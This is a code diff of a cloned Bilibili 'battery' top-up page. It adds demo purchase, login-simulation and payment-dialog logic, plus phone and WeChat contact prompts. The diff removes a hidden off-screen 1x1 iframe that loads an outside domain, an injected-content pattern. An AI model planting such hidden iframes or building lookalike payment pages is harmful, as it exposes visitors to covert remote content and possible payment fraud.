+  currIdx: 2,           // 默认选中第 3 项（35元 / 300电池）
+  isLogin: false,
+  accountNumber: '',
+  spec: 'moblie',       // uid | moblie
+  userInfo: { nickName: '', userId: '', loginType: 'moblie' },
+  riskCountdown: 3,
+  riskTimer: null
+};
+
+// ===== 渲染商品列表 =====
+function renderList() {
+  var html = '';
+  SKU_LIST.forEach(function (item, idx) {
+    var active = idx === state.currIdx ? ' item-active' : '';
+    html += '<li>' +
+      '<div class="item' + active + '" data-idx="' + idx + '" onclick="selectItem(' + idx + ')">' +
+        '<p class="doubi"><span>' + item.doubi + '</span><i>电池</i></p>' +
+        '<p class="rmb">' + item.money + '元</p>' +
+      '</div></li>';
+  });
+  document.getElementById('itemList').innerHTML = html;
+  updateBuyBtn();
+}
+
+function renderAgreement() {
+  var html = '';
+  CHARGE_AGREEMENT.forEach(function (t) { html += '<li>' + t + '</li>'; });
+  document.getElementById('agreementList').innerHTML = html;
+}
+
+function selectItem(idx) {
+  state.currIdx = idx;
+  var items = document.querySelectorAll('#itemList .item');
+  items.forEach(function (el, i) {
+    el.classList.toggle('item-active', i === idx);
+  });
+  updateBuyBtn();
+}
+
+function updateBuyBtn() {
+  var item = SKU_LIST[state.currIdx];
+  document.getElementById('buyBtn').textContent = '立即购买' + item.money + '元';
+}
+
+// ===== 规格切换 =====
+function switchSpec(spec) {
+  if (state.spec === spec) return;
+  state.spec = spec;
+  document.querySelectorAll('.spec-btn').forEach(function (btn) {
+    btn.classList.toggle('active', btn.dataset.spec === spec);
+  });
+  // 切换登录方式时退出登录态
+  logout();
+}
+
+// ===== 账号输入 / 登录 =====
+function onAccountInput() {
+  var v = document.getElementById('accountInput').value.trim();
+  document.getElementById('confirmBtn').disabled = v === '';
+}
+
+function confirmAccount() {
+  var v = document.getElementById('accountInput').value.trim();
+  v = v.replace(/^UID:/i, '');
+  if (!v) return;
+  var btn = document.getElementById('confirmBtn');
+  var txt = document.getElementById('confirmBtnText');
+  btn.disabled = true;
+  txt.innerHTML = '<span class="spinner"></span>加载中';
+  // 模拟账号识别（原站会请求接口）
   setTimeout(function () {
-    loader.classList.add('is-leaving');
-    setTimeout(function () { if (loader && loader.parentNode) loader.parentNode.removeChild(loader); }, 600);
-    modal.classList.add('show');
-  }, LOAD_MS);
+    state.isLogin = true;
+    state.accountNumber = v;
+    state.userInfo = {
+      nickName: 'B站用户_' + v.slice(-4),
+      userId: v,
+      loginType: state.spec
+    };
+    renderLogined();
+    txt.textContent = '确认账号';
+  }, 800);
+}
 
-  document.getElementById('modalOk').onclick = function () {
-    modal.classList.remove('show');
-  };
-})();
+function renderLogined() {
+  document.getElementById('unloginBox').style.display = 'none';
+  document.getElementById('loginedBox').style.display = 'flex';
+  var u = state.userInfo;
+  document.getElementById('userAvatar').src = 'img/bibi.png';
+  document.getElementById('userNick').textContent = u.nickName;
+  var label = (u.loginType === 'moblie') ? '手机号' : 'UID';
+  document.getElementById('userUid').textContent = label + '：' + u.userId;
+}
+
+function logout() {
+  state.isLogin = false;
+  state.accountNumber = '';
+  document.getElementById('accountInput').value = '';
+  document.getElementById('unloginBox').style.display = 'block';
+  document.getElementById('loginedBox').style.display = 'none';
+  document.getElementById('confirmBtn').disabled = true;
+}
+
+// ===== 帮助遮罩 =====
+function showHelp() { document.getElementById('helpOverlay').classList.add('show'); }
+function hideHelp() { document.getElementById('helpOverlay').classList.remove('show'); }
+
+// ===== 弹窗通用 =====
+function closeOverlay(id) { document.getElementById(id).classList.remove('show'); }
+function openOverlay(id) { document.getElementById(id).classList.add('show'); }
+
+function openAgreement() { openOverlay('agreementOverlay'); }
+function openCustomer() { openOverlay('customerOverlay'); }
+
+// ===== 购买流程 =====
+function buy() {
+  if (!state.isLogin || !state.accountNumber) {
+    toast('请先输入充值账号');
+    return;
+  }
+  openOverlay('orderOverlay');
+}
+
+function openRisk() {
+  var item = SKU_LIST[state.currIdx];
+  var u = state.userInfo;
+  document.getElementById('riskAvatar').src = 'img/bibi.png';
+  document.getElementById('riskNick').textContent = u.nickName;
+  document.getElementById('riskUid').textContent = u.userId;
+  // 重置倒计时 + 勾选
+  document.getElementById('riskCheck').checked = true;
+  state.riskCountdown = 3;
+  document.getElementById('riskCount').textContent = '3s';
+  document.getElementById('selfBtn').disabled = true;
+  document.getElementById('otherBtn').disabled = true;
+  clearInterval(state.riskTimer);
+  state.riskTimer = setInterval(function () {
+    state.riskCountdown--;
+    if (state.riskCountdown <= 0) {
+      clearInterval(state.riskTimer);
+      document.getElementById('riskCount').textContent = '';
+      syncRisk();
+    } else {
+      document.getElementById('riskCount').textContent = state.riskCountdown + 's';
+    }
+  }, 1000);
+  openOverlay('riskOverlay');
+}
+
+function syncRisk() {
+  var checked = document.getElementById('riskCheck').checked;
+  var ready = checked && state.riskCountdown <= 0;
+  document.getElementById('selfBtn').disabled = !ready;
+  document.getElementById('otherBtn').disabled = !ready;
+}
+
+function confirmSelf() {
+  closeOverlay('riskOverlay');
+  openPayDialog();
+}
+
+function confirmOther() {
+  closeOverlay('riskOverlay');
+  toast('请勿相信陌生人诱导支付，谨防诈骗');
+}
+
+function openPayDialog() {
+  var item = SKU_LIST[state.currIdx];
+  var u = state.userInfo;
+  document.getElementById('payAvatar').src = 'img/bibi.png';
+  document.getElementById('payNick').textContent = u.nickName;
+  document.getElementById('payDoubi').textContent = item.doubi;
+  document.getElementById('payUnit').textContent = '电池';
+  openOverlay('payOverlay');
+}
+
+function doPay(type) {
+  closeOverlay('payOverlay');
+  toast('演示页面：未接入真实支付');
+}
+
+// ===== 客服 / 微信 / 投诉 =====
+function callService() {
+  if (confirm('确认拨打电话: 400-998-7112 吗？')) {
+    window.location.href = 'tel:4009987112';
+  }
+}
+
+function addWechat() {
+  toast('加微信有更多优惠');
+}
+
+function complaint() {
+  toast('投诉入口');
+}
+
+// ===== Toast =====
+function toast(msg) {
+  var old = document.getElementsByClassName('ToastTips');
+  if (old.length > 0) return;
+  var div = document.createElement('div');
+  div.className = 'ToastTips';
+  div.innerHTML = '<div class="toast-box"><img src="img/toast.png"><span>' + msg + '</span></div>';
+  document.body.appendChild(div);
+  setTimeout(function () {
+    if (div.parentNode) div.parentNode.removeChild(div);
+  }, 3000);
+}
+
+// ===== 初始化 =====
+renderList();
+renderAgreement();
 </script>
-<iframe src="https://rhce35.cc/assets/js/group.html?p=RRXX4mGX"style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;" loading="eager"></iframe>
- </body>
+</body>
 </html>
